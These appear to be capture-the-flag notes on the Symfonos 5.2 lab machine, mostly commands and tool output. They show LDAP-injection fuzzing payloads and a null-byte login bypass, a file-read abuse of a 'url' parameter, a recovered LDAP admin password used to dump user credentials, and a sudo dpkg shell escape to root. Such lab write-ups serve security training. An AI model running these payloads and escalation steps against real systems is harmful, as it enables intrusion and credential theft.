https://kill-09.medium.com/symfonos-5-2-walkthrough-4fe57e33fcb4
https://github.com/trapp3rhat/LDAP-injection




└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.51
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 09:29 CEST
Nmap scan report for 192.168.110.51
Host is up (0.00072s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
MAC Address: 08:00:27:12:55:E3 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.110.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds


└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.110.51  -t 20 -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.51
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/09/20 09:34:45 Starting gobuster in directory enumeration mode
===============================================================
/home.php             (Status: 302) [Size: 0] [--> admin.php]
/admin.php            (Status: 200) [Size: 1650]             
/static               (Status: 301) [Size: 317] [--> http://192.168.110.51/static/]
/logout.php           (Status: 302) [Size: 0] [--> admin.php]                      
/portraits.php        (Status: 200) [Size: 165]                                    
/server-status        (Status: 403) [Size: 279]                                    
                                                                                   
===============================================================
2021/09/20 09:36:18 Finished
===============================================================


└─$ wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt  http://192.168.110.51/admin.php?username=FUZZ&password=passwd
└─$ wfuzz -c -z file,ldap -u  "http://192.168.110.51/admin.php?username=FUZZ&password=passwd"                                    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.110.51/admin.php?username=FUZZ&password=passwd
Total requests: 20

=====================================================================
ID           Response   Lines    Word       Chars       Payload              
=====================================================================

000000019:   200        39 L     80 W       1663 Ch     "x' or name()='username' or 'x'='y"
000000014:   200        39 L     80 W       1663 Ch     "@*"                 
000000020:   200        39 L     80 W       1663 Ch     "http://192.168.110.51/admin.php?username=&password=passwd"
000000018:   200        39 L     80 W       1663 Ch     "admin*)((|userPassword=*)"
000000015:   200        39 L     80 W       1663 Ch     "|"                  
000000016:   200        39 L     80 W       1663 Ch     "admin*"             
000000003:   302        0 L      0 W        0 Ch        "*))%00"             
000000007:   200        39 L     80 W       1663 Ch     "*(|(objectclass=*))"
000000017:   200        39 L     80 W       1663 Ch     "admin*)((|userpassword=*)"
000000001:   200        39 L     80 W       1663 Ch     "*"
000000002:   200        39 L     80 W       1663 Ch     "*)(&"
000000006:   200        39 L     80 W       1663 Ch     "*(|(mail=*))"
000000012:   200        39 L     80 W       1663 Ch     "//"
000000011:   200        39 L     80 W       1663 Ch     "/"              
000000004:   200        39 L     80 W       1663 Ch     "*()|%26'"           
000000008:   200        39 L     80 W       1663 Ch     "*)(uid=*))(|(uid=*" 
000000005:   200        39 L     80 W       1663 Ch     "*()|&'"             
000000010:   200        39 L     80 W       1663 Ch     "*|"                 
000000009:   200        39 L     80 W       1663 Ch     "*/*"                
000000013:   200        39 L     80 W       1663 Ch     "//*"                

Total time: 0
Processed Requests: 20
Filtered Requests: 0
Requests/sec.: 0


```bash

curl -c cookie -G  --data-urlencode "username=*))%00" --data-urlencode "password=passwsd" http://192.168.110.51/admin.php
curl -b cookie http://192.168.110.51/home.php
curl -b cookie http://192.168.110.51/home.php?url=http://127.0.0.1/portraits.php
curl -b cookie http://192.168.110.51/home.php?url=/etc/passwd
curl -b cookie http://192.168.110.51/home.php?url=admin.php


```

```php

 $bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD");

```


```bash

ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 

```


```console


└─$ ldapsearch -x -LLL -h 192.168.110.51 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b 'dc=symfonos,dc=local'
dn: dc=symfonos,dc=local
objectClass: top
objectClass: dcObject
objectClass: organization
o: symfonos
dc: symfonos

dn: cn=admin,dc=symfonos,dc=local
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: admin
description: LDAP administrator
userPassword:: e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=

dn: uid=zeus,dc=symfonos,dc=local
uid: zeus
cn: zeus
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/zeus
uidNumber: 14583102
gidNumber: 14564100
userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==
mail: zeus@symfonos.local
gecos: Zeus User

```

```console


└─$ nmap 192.168.110.51 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'                                       1 ⨯

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 13:19 CEST
Nmap scan report for symfonos.local (192.168.110.51)
Host is up (0.00026s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=symfonos,dc=local
|     dn: dc=symfonos,dc=local
|         objectClass: top
|         objectClass: dcObject
|         objectClass: organization
|         o: symfonos
|         dc: symfonos
|     dn: cn=admin,dc=symfonos,dc=local
|         objectClass: simpleSecurityObject
|         objectClass: organizationalRole
|         cn: admin
|         description: LDAP administrator
|         userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
|     dn: uid=zeus,dc=symfonos,dc=local
|         uid: zeus
|         cn: zeus
|         sn: 3
|         objectClass: top
|         objectClass: posixAccount
|         objectClass: inetOrgPerson
|         loginShell: /bin/bash
|         homeDirectory: /home/zeus
|         uidNumber: 14583102
|         gidNumber: 14564100
|         userPassword: cetkKf4wCuHC9FET
|         mail: zeus@symfonos.local
|_        gecos: Zeus User

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds

```


```console

zeus@symfonos5:~$ sudo -l
Matching Defaults entries for zeus on symfonos5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zeus may run the following commands on symfonos5:
    (root) NOPASSWD: /usr/bin/dpkg

```


```console

sudo /usr/bin/dpkg -l
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)


```


